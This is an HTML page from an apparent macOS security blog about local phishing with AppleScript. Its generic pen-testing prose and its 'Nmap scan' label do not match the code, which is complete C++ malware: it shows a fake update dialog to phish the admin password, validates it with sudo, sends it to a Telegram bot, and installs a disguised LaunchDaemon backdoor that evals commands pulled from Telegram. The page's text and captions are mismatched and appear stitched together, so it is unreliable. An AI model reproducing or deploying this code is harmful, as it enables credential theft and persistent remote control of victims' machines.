<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ivan's macOS Security Research Blog</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/themes/prism-okaidia.min.css">
    <link rel="stylesheet" href="../assets/css/styles.css">
    
</head>
<body>
    <header>
        <!-- SVG Logo -->
        <a href="../index.html">
        <svg xmlns="http://www.w3.org/2000/svg" width="36" height="48" viewBox="0 0 14 18" class="logo">
            <path d="M4.02,16.23c-.25-.16-.51-.39-.77-.71-.18-.21-.4-.51-.66-.9-.45-.65-.82-1.4-1.1-2.25-.31-.93-.46-1.82-.46-2.69,0-.97,.21-1.82,.62-2.53,.32-.57,.75-1.02,1.3-1.35,.55-.34,1.13-.51,1.76-.52,.22,0,.45,.03,.7,.09,.18,.05,.4,.13,.66,.23,.34,.13,.53,.21,.59,.23,.2,.07,.37,.1,.5,.1,.1,0,.24-.03,.4-.08,.09-.03,.26-.09,.5-.19,.24-.09,.43-.16,.58-.22,.23-.07,.45-.13,.65-.16,.24-.04,.48-.05,.71-.03,.44,.03,.84,.12,1.2,.26,.63,.25,1.14,.65,1.52,1.21-.16,.1-.31,.21-.45,.34-.31,.28-.57,.59-.76,.93-.27,.48-.4,1.01-.4,1.56,.01,.67,.18,1.26,.52,1.77,.24,.37,.56,.69,.95,.95,.19,.13,.36,.22,.52,.28-.08,.26-.17,.49-.25,.68-.22,.52-.48,.99-.77,1.43-.27,.39-.48,.68-.64,.87-.25,.3-.49,.52-.73,.68-.28,.18-.58,.27-.9,.27-.22,.01-.43-.02-.64-.08-.12-.04-.3-.1-.53-.2-.23-.1-.42-.17-.56-.21-.23-.06-.47-.09-.72-.09s-.49,.03-.72,.09c-.16,.04-.34,.11-.56,.2-.26,.11-.43,.18-.53,.21-.2,.06-.41,.1-.61,.11-.32,0-.62-.09-.92-.28ZM8.26,4.81c-.42,.21-.82,.3-1.22,.27-.06-.4,0-.81,.17-1.26,.15-.38,.35-.73,.62-1.04,.27-.31,.6-.57,1.01-.78,.41-.21,.8-.32,1.17-.34,.05,.42,0,.84-.15,1.28-.14,.4-.35,.76-.62,1.09-.27,.33-.6,.59-.98,.78Z" fill="currentColor"/>
        </svg>
        <h1>Ivan's <br>macOS Security Research <br>Blog</h1>
        </a>
        <div class="menu-btn" onclick="openNav()">â˜°</div>
        <nav>
            <ul>
                <li><a href="../index.html">Home</a></li>
                <li><a href="../about.html">Whoami</a></li>
                <li><a href="../blog.html">Blog</a></li>
            </ul>
        </nav>
    </header>
    
    <div id="myNav" class="nav-overlay">
        <a href="javascript:void(0)" class="closebtn" onclick="closeNav()">&times;</a>
        <a href="../index.html">Home</a>
        <a href="../about.html">Whoami</a>
        <a href="../blog.html">Blog</a>
    </div>
    <!-- Modal for image preview -->
<div id="myModal" class="modal">
    <span class="close">&times;</span>
    <img class="modal-content" id="img01">
    <div id="caption"></div>
</div>
<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/prism.min.js"></script>
    <!-- Plugin -->
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/plugins/line-numbers/prism-line-numbers.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-cpp.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-bash.min.js"></script>
    <main>
        <article>
            <h3>Local Phishing on macOS using Applescript to get user password</h3>
            <p>This post will walk through the basics of penetration testing and how ethical hackers uncover vulnerabilities.</p>
            
            <h4>What is Penetration Testing?</h4>
            <p>Penetration testing, also known as pen testing, is the practice of testing a computer system, network or web application to find vulnerabilities that an attacker could exploit.</p>

            <h4>Basic Tools Used</h4>
            <p>Here are some of the fundamental tools used in penetration testing:</p>
            <ul>
                <li>Metasploit</li>
                <li>Wireshark</li>
                <li>Nmap</li>
                <li>Burp Suite</li>
            </ul>
            
            <h4>Example of a Simple Test</h4>
            <p>Below is an example of a simple network scan using Nmap:</p>
            <pre class="line-numbers"><code class="language-bash">#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include <cstdlib>
#include <cstring>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <Security/Authorization.h>
#include <Security/AuthorizationTags.h>
#include <curl/curl.h>

#define TELEGRAM_BOT_TOKEN "YOUR_TELEGRAM_BOT_TOKEN"
#define TELEGRAM_CHAT_ID "YOUR_TELEGRAM_CHAT_ID"

std::string run_command(const std::string &cmd) {
    std::string result;
    char buffer[128];
    FILE *pipe = popen(cmd.c_str(), "r");
    if (!pipe) throw std::runtime_error("popen() failed!");
    try {
        while (fgets(buffer, sizeof buffer, pipe) != nullptr) {
            result += buffer;
        }
    } catch (...) {
        pclose(pipe);
        throw;
    }
    pclose(pipe);
    return result;
}

std::string phish_password() {
    std::string password_script = R"(
        osascript -e 'tell application "System Events" to activate' \
                  -e 'display dialog "System needs to install a critical update. Please enter your admin password to proceed:" default answer "" with hidden answer buttons {"OK"} default button 1 with icon caution' \
                  -e 'text returned of result'
    )";
    return run_command(password_script);
}

bool validate_password(const std::string &username, const std::string &password) {
    AuthorizationRef authorizationRef;
    AuthorizationItem authItem = {kAuthorizationRightExecute, 0, NULL, 0};
    AuthorizationRights authRights = {1, &authItem};
    AuthorizationEnvironment authEnv = {0, NULL};
    AuthorizationFlags flags = kAuthorizationFlagDefaults | kAuthorizationFlagInteractionAllowed | kAuthorizationFlagExtendRights | kAuthorizationFlagPreAuthorize;

    OSStatus status = AuthorizationCreate(&authRights, &authEnv, flags, &authorizationRef);
    if (status != errAuthorizationSuccess) {
        std::cerr << "AuthorizationCreate failed: " << status << std::endl;
        return false;
    }

    std::string command = "echo \"" + password + "\" | sudo -S /usr/bin/true";
    int cmd_status = system(command.c_str());
    AuthorizationFree(authorizationRef, kAuthorizationFlagDefaults);

    return (cmd_status == 0);
}

void send_to_telegram(const std::string &message) {
    std::string url = "https://api.telegram.org/bot" + std::string(TELEGRAM_BOT_TOKEN) + "/sendMessage?chat_id=" + std::string(TELEGRAM_CHAT_ID) + "&text=" + message;
    CURL *curl;
    CURLcode res;
    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }
}

void create_backdoor_script(const std::string &path) {
    std::ofstream script_file(path);
    script_file << R"(
#!/bin/bash
while true; do
    RESPONSE=$(curl -s https://api.telegram.org/botYOUR_TELEGRAM_BOT_TOKEN/getUpdates)
    COMMAND=$(echo $RESPONSE | grep -o '"text":"[^"]*"' | tail -1 | cut -d'"' -f4)
    if [ "$COMMAND" != "" ]; then
        eval $COMMAND
    fi
    sleep 60
done
    )";
    script_file.close();
    chmod(path.c_str(), 0755);
}

void create_launchdaemon(const std::string &plist_path, const std::string &script_path) {
    std::ofstream plist_file(plist_path);
    plist_file << R"(
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>)" << script_path << R"(</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
    )";
    plist_file.close();
    chmod(plist_path.c_str(), 0644);
}

int main() {
    std::string admin_password = phish_password();
    if (admin_password.empty()) {
        std::cerr << "Failed to capture admin password" << std::endl;
        return 1;
    }

    std::string username = run_command("whoami");
    username.erase(std::remove(username.begin(), username.end(), '\n'), username.end());
    if (validate_password(username, admin_password)) {
        std::cout << "Password validation successful" << std::endl;

        send_to_telegram(admin_password);

        std::string plist_path = "/Library/LaunchDaemons/com.apple.update.plist";
        std::string script_path = "/Library/Application Support/com.apple.backdoor.sh";

        create_backdoor_script(script_path);
        create_launchdaemon(plist_path, script_path);

        std::string command = "sudo launchctl load " + plist_path;
        system(command.c_str());
    } else {
        std::cerr << "Password validation failed" << std::endl;
    }

    return 0;
}</code></pre>

            <h4>Screenshots</h4>
            <p>Here's a screenshot demonstrating the use of Wireshark to monitor network traffic:</p>
            <img src="../assets/images/IMG_5401.jpeg" alt="Wireshark Example">
            <center style="color:#787878; padding-top:5px;">Figure 1<br>The macho_best_slice API is Little Known</center>
            <h4>Conclusion</h4>
            <p>Penetration testing is a crucial practice for improving the security of systems. It helps organizations identify vulnerabilities before they can be exploited maliciously.</p>
        </article>
    </main>
    
    <script>
    // Add line numbers to all code blocks within pre tags
    document.addEventListener("DOMContentLoaded", function() {
        // Select all <pre><code> blocks
        const codeBlocks = document.querySelectorAll('pre code');

        // Loop through each code block
        codeBlocks.forEach(block => {
            // Get the number of lines in the code block by splitting its text
            const lines = block.textContent.split('\n').length;

            // Initialize an empty string for line numbers
            let numbers = '';

            // Generate the line numbers
            for (let i = 1; i <= lines; i++) {
                numbers += `${i}\n`;
            }

            // Create a span element for the line numbers
            const numbersElement = document.createElement('span');
            numbersElement.classList.add('line-numbers-rows');
            numbersElement.textContent = numbers;

            // Style and position the span
            numbersElement.style.position = 'absolute';
            numbersElement.style.left = '0';
            numbersElement.style.width = '3em';
            numbersElement.style.paddingRight = '10px';
            numbersElement.style.textAlign = 'right';
            numbersElement.style.color = '#888';
            numbersElement.style.borderRight = '1px solid #ddd';

            // Add the line numbers span to the code block
            block.style.position = 'relative';
            block.style.paddingLeft = '4em'; // Adjust padding for line numbers
            block.prepend(numbersElement);
        });
    });
</script>
    <script>
    // Get the modal
    var modal = document.getElementById('myModal');

    // Get the image and insert it inside the modal - use its "alt" text as a caption
    var modalImg = document.getElementById("img01");
    var captionText = document.getElementById("caption");
    document.querySelectorAll('article img').forEach(img => {
        img.onclick = function(){
            modal.style.display = "block";
            modalImg.src = this.src;
            captionText.innerHTML = this.alt;
        }
    });

    // Get the <span> element that closes the modal
    var span = document.getElementsByClassName("close")[0];

    // When the user clicks on <span> (x), close the modal
    span.onclick = function() { 
        modal.style.display = "none";
    }
</script>
    <script>
        function openNav() {
            document.getElementById("myNav").style.width = "100%";
        }

        function closeNav() {
            document.getElementById("myNav").style.width = "0%";
        }
    </script>
    
</body>
</html>